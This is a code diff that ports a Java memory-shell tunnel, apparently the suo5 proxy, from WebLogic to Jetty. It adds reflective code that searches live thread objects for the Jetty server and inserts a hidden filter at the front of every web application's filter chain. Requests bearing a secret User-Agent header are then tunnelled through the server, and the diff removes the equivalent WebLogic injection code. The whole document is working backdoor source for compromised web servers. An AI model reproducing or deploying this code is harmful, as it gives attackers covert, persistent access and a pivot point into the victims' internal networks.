@@ -1,27 +1,28 @@
 import javax.net.ssl.*;
-import javax.servlet.*;
+import javax.servlet.FilterConfig;
+import javax.servlet.ServletContext;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.*;
 import java.lang.reflect.*;
+import java.lang.reflect.Proxy;
 import java.net.*;
 import java.nio.ByteBuffer;
 import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
 import java.util.*;
 
-//weblogic 10.3.6 - weblogic 14
-public class Suo5WebLogicFilter extends ClassLoader implements Filter, Runnable, HostnameVerifier, X509TrustManager {
+//jetty7-10.11 test
+public class Suo5JettyFilter extends ClassLoader implements InvocationHandler, Runnable, HostnameVerifier, X509TrustManager {
     private HashMap parameterMap;
-    private static String urlPattern;
-    private static String userAgent;
+    private String urlPattern;
+    private String userAgent;
 
     public static HashMap addrs = collectAddr();
     public static HashMap ctx = new HashMap();
 
     InputStream gInStream;
     OutputStream gOutStream;
-
 
     public String getp(String key) {
         try {
@@ -44,160 +45,284 @@ public class Suo5WebLogicFilter extends ClassLoader implements Filter, Runnable,
 
     public String toString() {
 
-        this.parameterMap.put("result", this.addFilter(this.getClass()).getBytes());
-        this.parameterMap = null;
+        try {
+            Class servletRequestFilterClass = null;
+            try {
+                servletRequestFilterClass = loadClasses("jakarta.servlet.Filter");
+            } catch (Exception e) {
+                try {
+                    servletRequestFilterClass = loadClasses("javax.servlet.Filter");
+                } catch (ClassNotFoundException ex) {
+
+                }
+            }
+            if (servletRequestFilterClass !=null){
+                addFilter(Proxy.newProxyInstance(servletRequestFilterClass.getClassLoader(),new Class[]{servletRequestFilterClass},this),servletRequestFilterClass);
+                this.parameterMap.put("result", "ok".getBytes());
+                this.parameterMap = null;
+            }
+        }catch (Throwable e){
+
+        }
+
         return "";
     }
 
-    public Suo5WebLogicFilter(ClassLoader loader){
-        super(loader);
+    public Suo5JettyFilter() {
     }
 
-    public Suo5WebLogicFilter(){
-
-    }
-
-    public Suo5WebLogicFilter(InputStream in, OutputStream out) {
+    public Suo5JettyFilter(InputStream in, OutputStream out) {
         this.gInStream = in;
         this.gOutStream = out;
     }
 
-    public static Object[] getContextsByMbean() throws Throwable {
-        HashSet webappContexts = new HashSet();
-        Class serverRuntimeClass = Class.forName("weblogic.t3.srvr.ServerRuntime");
-        Class webAppServletContextClass = Class.forName("weblogic.servlet.internal.WebAppServletContext");
-        Method theOneMethod = serverRuntimeClass.getMethod("theOne");
-        theOneMethod.setAccessible(true);
-        Object serverRuntime = theOneMethod.invoke(null);
+    public Suo5JettyFilter(ClassLoader loader){
+        super(loader);
+    }
 
-        Method getApplicationRuntimesMethod = serverRuntime.getClass().getMethod("getApplicationRuntimes");
-        getApplicationRuntimesMethod.setAccessible(true);
-        Object applicationRuntimes = getApplicationRuntimesMethod.invoke(serverRuntime);
-        int applicationRuntimeSize = Array.getLength(applicationRuntimes);
-        for (int i = 0; i < applicationRuntimeSize; i++) {
-            Object applicationRuntime =  Array.get(applicationRuntimes,i);
 
-            try {
-                Method getComponentRuntimesMethod = applicationRuntime.getClass().getMethod("getComponentRuntimes");
-                Object componentRuntimes = getComponentRuntimesMethod.invoke(applicationRuntime);
-                int componentRuntimeSize = Array.getLength(componentRuntimes);
-                for (int j = 0; j < componentRuntimeSize; j++) {
-                    Object context = getFieldValue(Array.get(componentRuntimes,j),"context");
-                    if (webAppServletContextClass.isInstance(context)){
-                        webappContexts.add(context);
-                    }
-                }
-            }catch (Throwable e){
-
+    public Class loadClasses(String className) throws ClassNotFoundException {
+        ArrayList<ClassLoader> classLoaders = new ArrayList<>();
+        classLoaders.add(this.getClass().getClassLoader());
+        try {
+            classLoaders.add(Thread.currentThread().getContextClassLoader());
+            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
+            int threadCount = threadGroup.activeCount();
+            Thread[] threads = new Thread[threadCount];
+            threadCount = threadGroup.enumerate(threads);
+            for (int i = 0; i < threadCount; i++) {
+                classLoaders.add(threads[i].getContextClassLoader());
             }
+        }catch (Exception e){
 
+        }
+        int loaders = classLoaders.size();
+        for (int i = 0; i < loaders; i++) {
+            ClassLoader loader = classLoaders.get(i);
+            if (loader!=null){
+                try {
+                    return Class.forName(className,true,loader);
+                }catch(Throwable e){
+
+                }
+            }
+        }
+        return Class.forName(className);
+    }
+
+
+    public static Object[] getServers() throws Throwable {
+        HashSet contexts = new HashSet();
+        HashSet<String> blackType = new HashSet<String>();
+        blackType.add(int.class.getName());
+        blackType.add(short.class.getName());
+        blackType.add(long.class.getName());
+        blackType.add(double.class.getName());
+        blackType.add(byte.class.getName());
+        blackType.add(float.class.getName());
+        blackType.add(char.class.getName());
+        blackType.add(boolean.class.getName());
+        blackType.add(Integer.class.getName());
+        blackType.add(Short.class.getName());
+        blackType.add(Long.class.getName());
+        blackType.add(Double.class.getName());
+        blackType.add(Byte.class.getName());
+        blackType.add(Float.class.getName());
+        blackType.add(Character.class.getName());
+        blackType.add(Boolean.class.getName());
+        blackType.add(String.class.getName());
+        Object jettyServer = searchObject("org.eclipse.jetty.server.Server",Thread.currentThread(),new HashSet(),blackType,10,0);
+        if (jettyServer != null) {
             try {
-                Set childrenSet = (Set) getFieldValue(applicationRuntime,"children");
-                Iterator iterator = childrenSet.iterator();
-
-                while (iterator.hasNext()){
-                    Object componentRuntime = iterator.next();
-                    try {
-                        Object context = getFieldValue(componentRuntime,"context");
-                        if (webAppServletContextClass.isInstance(context)){
-                            webappContexts.add(context);
+                Object serverHandle = getFieldValue(jettyServer,"_handler");
+                Object handles = serverHandle.getClass().getMethod("getChildHandlers").invoke(serverHandle);
+                if (handles.getClass().isArray()) {
+                    int handleSize = Array.getLength(handles);
+                    for (int i = 0; i < handleSize; i++) {
+                        Object handle = Array.get(handles,i);
+                        if (handle!=null && "org.eclipse.jetty.webapp.WebAppContext".equals(handle.getClass().getName())){
+                            contexts.add(handle);
                         }
-                    }catch (Throwable e){
-
                     }
                 }
-
             }catch (Throwable e){
 
             }
         }
-        return webappContexts.toArray();
+        return contexts.toArray();
     }
-    public static Object[] getContextsByThreads()throws Throwable{
-        HashSet webappContexts = new HashSet();
-        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
-        int threadCount = threadGroup.activeCount();
-        Thread[] threads = new Thread[threadCount];
-        threadGroup.enumerate(threads);
-        for (int i = 0; i < threadCount; i++) {
-            Thread thread = threads[i];
-            if (thread!=null){
-                Object workEntry = getFieldValue(thread,"workEntry");
-                if (workEntry!=null){
+    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDepth,int currentDepth)throws Throwable {
+        currentDepth++;
+
+        if (currentDepth >= maxDepth){
+            return null;
+        }
+
+        if (object != null){
+
+            if (targetClassName.equals(object.getClass().getName())){
+                return object;
+            }
+
+            Integer hash = System.identityHashCode(object);
+            if (!blacklist.contains(hash)) {
+                blacklist.add(new Integer(hash));
+                Field[] fields = null;
+                ArrayList<Field> fieldsArray = new ArrayList();
+                Class objClass = object.getClass();
+                while (objClass != null){
+                    Field[] fields1 = objClass.getDeclaredFields();
+                    fieldsArray.addAll(Arrays.asList(fields1));
+                    objClass = objClass.getSuperclass();
+                }
+                fields = fieldsArray.toArray(new Field[0]);
+
+
+                for (int i = 0; i < fields.length; i++) {
+                    Field field = fields[i];
+
                     try {
-                        Object context = null;
-                        Object connectionHandler = getFieldValue(workEntry,"connectionHandler");
-                        if (connectionHandler!=null){
-                            Object request = getFieldValue(connectionHandler,"request");
-                            if (request!=null){
-                                context = getFieldValue(request,"context");
+                        field.setAccessible(true);
+                        Class fieldType = field.getType();
+                        if (!blackType.contains(fieldType.getName())){
+                            Object fieldValue = field.get(object);
+                            if (fieldValue != null){
+                                Object ret = null;
+                                if (fieldType.isArray()){
+                                    if (!blackType.contains(fieldType.getComponentType().getName())){
+                                        int arraySize = Array.getLength(fieldValue);
+                                        for (int j = 0; j < arraySize; j++) {
+                                            ret = searchObject(targetClassName,Array.get(fieldValue,j),blacklist,blackType,maxDepth,currentDepth);
+                                            if (ret!= null){
+                                                break;
+                                            }
+                                        }
+                                    }
+                                }else{
+                                    ret = searchObject(targetClassName,fieldValue,blacklist,blackType,maxDepth,currentDepth);
+                                }
+                                if (ret!= null){
+                                    return ret;
+                                }
                             }
                         }
-                        if (context == null){
-                            context = getFieldValue(workEntry,"context");
-                        }
-
-                        if (context!=null){
-                            webappContexts.add(context);
-                        }
                     }catch (Throwable e){
 
                     }
                 }
             }
         }
-        return webappContexts.toArray();
-    }
-    public static Object[] getContexts() {
-        HashSet webappContexts = new HashSet();
-        try {
-            webappContexts.addAll(Arrays.asList(getContextsByMbean()));
-        }catch (Throwable e){
+        return null;
 
-        }
-        try {
-            webappContexts.addAll(Arrays.asList(getContextsByThreads()));
-        }catch (Throwable e){
-
-        }
-        return webappContexts.toArray();
     }
 
-    public static String addFilter(Class filterClass){
-        Object[] contexts = getContexts();
-        for (int i = 0; i < contexts.length; i++) {
+    private boolean addFilter(Object filter,Class filterClass) throws Throwable {
+        boolean isOk = false;
+        try {
+            Object[] obj = getServers();
+            for (int i = 0; i < obj.length; i++) {
+                Object webappContext = obj[i];
+                try {
+                    Object servletHandler = getFieldValue(webappContext,"_servletHandler");
+                    Class filterHolderClass = Class.forName("org.eclipse.jetty.servlet.FilterHolder",true,servletHandler.getClass().getClassLoader());
+                    Class filterMappingClass = Class.forName("org.eclipse.jetty.servlet.FilterMapping",true,servletHandler.getClass().getClassLoader());
+                    Constructor filterHolderConstructor = filterHolderClass.getConstructor(filterClass);
+                    Object filterHolder = filterHolderConstructor.newInstance(filter);
+                    Object filterMapping = filterMappingClass.newInstance();
+                    Method setFilterHolderMethod = filterMappingClass.getDeclaredMethod("setFilterHolder",filterHolderClass);
+                    setFilterHolderMethod.setAccessible(true);
+                    setFilterHolderMethod.invoke(filterMapping,filterHolder);
+                    filterMappingClass.getMethod("setPathSpecs",String[].class).invoke(filterMapping,new Object[]{new String[]{urlPattern}});
+
+                    servletHandler.getClass().getMethod("addFilter",filterHolderClass).invoke(servletHandler,filterHolder);
+                    servletHandler.getClass().getMethod("prependFilterMapping",filterMappingClass).invoke(servletHandler,filterMapping);
+                    isOk = true;
+                }catch (Throwable e) {
+
+                }
+            }
+        } catch (Throwable e) {
+
+        }
+
+
+        return isOk;
+    }
+
+
+    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+        if (method.getName().equals("doFilter")){
+            Object servletRequest = args[0];
+            Object servletResponse = args[1];
+            Object filterChain = args[2];
+
+            HttpServletRequest request = (HttpServletRequest) servletRequest;
+            HttpServletResponse response = (HttpServletResponse) servletResponse;
+            String agent = request.getHeader("User-Agent");
+            String contentType = request.getHeader("Content-Type");
+
+            if (agent == null || !agent.equals(userAgent)) {
+                if (filterChain != null) {
+                    filterChain.getClass().getMethod("doFilter").invoke(servletRequest,servletResponse);
+                }
+                return null;
+            }
+            if (contentType == null) {
+                return null;
+            }
+
             try {
-                Object webContext = contexts[i];
+                if (contentType.equals("application/plain")) {
+                    tryFullDuplex(request, response);
+                    return null;
+                }
 
-                Method getFilterManagerMethod = webContext.getClass().getMethod("getFilterManager");
-                getFilterManagerMethod.setAccessible(true);
-
-                Method getServletClassLoaderMethod = webContext.getClass().getMethod("getServletClassLoader");
-                getServletClassLoaderMethod.setAccessible(true);
-
-                Object servletClassLoader = getServletClassLoaderMethod.invoke(webContext);
-                Object filterManager = getFilterManagerMethod.invoke(webContext);
-                Map cachedClasses = (Map)getFieldValue(servletClassLoader,"cachedClasses");
-
-
-                //或者直接反射在这个classloader定义类 就不用写缓存了 不过就要硬编码一个class了
-                cachedClasses.put(filterClass.getName(),filterClass);
-
-                //String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
-                Method registerFilterMethod = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
-                registerFilterMethod.setAccessible(true);
-                registerFilterMethod.invoke(filterManager, filterClass.getName(), filterClass.getName(), new String[]{urlPattern}, null, null, new String[]{"REQUEST","FORWARD","INCLUDE","ERROR"});
-
-
-                //将我们的filter置为第一位
-                List filterPatternList = (List) getFieldValue(filterManager,"filterPatternList");
-                Object currentMapping = filterPatternList.remove(filterPatternList.size() - 1);
-                filterPatternList.add(0,currentMapping);
-            }catch (Throwable e){
-
+                if (contentType.equals("application/octet-stream")) {
+                    processDataBio(request, response);
+                } else {
+                    processDataUnary(request, response);
+                }
+            } catch (Throwable e) {
+//                System.out.printf("process data error %s\n", e);
+//                e.printStackTrace();
             }
         }
-        return "ok";
+        return null;
+    }
+
+    private Object invokeMethod(Object obj,String methodName,Object... parameters){
+        try {
+            ArrayList classes = new ArrayList();
+            if (parameters!=null){
+                for (int i=0;i<parameters.length;i++){
+                    Object o1=parameters[i];
+                    if (o1!=null){
+                        classes.add(o1.getClass());
+                    }else{
+                        classes.add(null);
+                    }
+                }
+            }
+            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));
+
+            return method.invoke(obj, parameters);
+        }catch (Exception e){
+//        	e.printStackTrace();
+        }
+        return null;
+    }
+
+    private Method getMethodByClass(Class cs,String methodName,Class... parameters){
+        Method method=null;
+        while (cs!=null){
+            try {
+                method=cs.getMethod(methodName, parameters);
+                cs=null;
+            }catch (Exception e){
+                cs=cs.getSuperclass();
+            }
+        }
+        return method;
     }
 
     public static Field getField(Object obj, String fieldName){
@@ -229,7 +354,7 @@ public class Suo5WebLogicFilter extends ClassLoader implements Filter, Runnable,
         return field;
     }
     public static Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field f = null;
+        Field f=null;
         if (obj instanceof Field){
             f=(Field)obj;
         }else {
@@ -240,50 +365,11 @@ public class Suo5WebLogicFilter extends ClassLoader implements Filter, Runnable,
         }
         return null;
     }
-
-
-    @Override
-    public void init(FilterConfig filterConfig) throws ServletException {
-
+    public String getParameter(Object requestObject,String name) {
+        return (String) invokeMethod(requestObject, "getParameter", name);
     }
-
-    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-        HttpServletRequest request = (HttpServletRequest) servletRequest;
-        HttpServletResponse response = (HttpServletResponse) servletResponse;
-        String agent = request.getHeader("User-Agent");
-        String contentType = request.getHeader("Content-Type");
-
-        if (agent == null || !agent.equals(userAgent)) {
-            if (filterChain != null) {
-                filterChain.doFilter(servletRequest, servletResponse);
-            }
-            return;
-        }
-        if (contentType == null) {
-            return;
-        }
-
-        try {
-            if (contentType.equals("application/plain")) {
-                tryFullDuplex(request, response);
-                return;
-            }
-
-            if (contentType.equals("application/octet-stream")) {
-                processDataBio(request, response);
-            } else {
-                processDataUnary(request, response);
-            }
-        } catch (Throwable e) {
-//                System.out.printf("process data error %s\n", e);
-//                e.printStackTrace();
-        }
-    }
-
-
-    @Override
-    public void destroy() {
-
+    public String getContentType(Object requestObject) {
+        return (String) invokeMethod(requestObject, "getContentType");
     }
 
     public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
@@ -491,7 +577,7 @@ public class Suo5WebLogicFilter extends ClassLoader implements Filter, Runnable,
 
         Thread t = null;
         try {
-            Suo5WebLogicFilter p = new Suo5WebLogicFilter(scInStream, respOutStream);
+            Suo5JettyFilter p = new Suo5JettyFilter(scInStream, respOutStream);
             t = new Thread(p);
             t.start();
             readReq(reqInputStream, scOutStream);
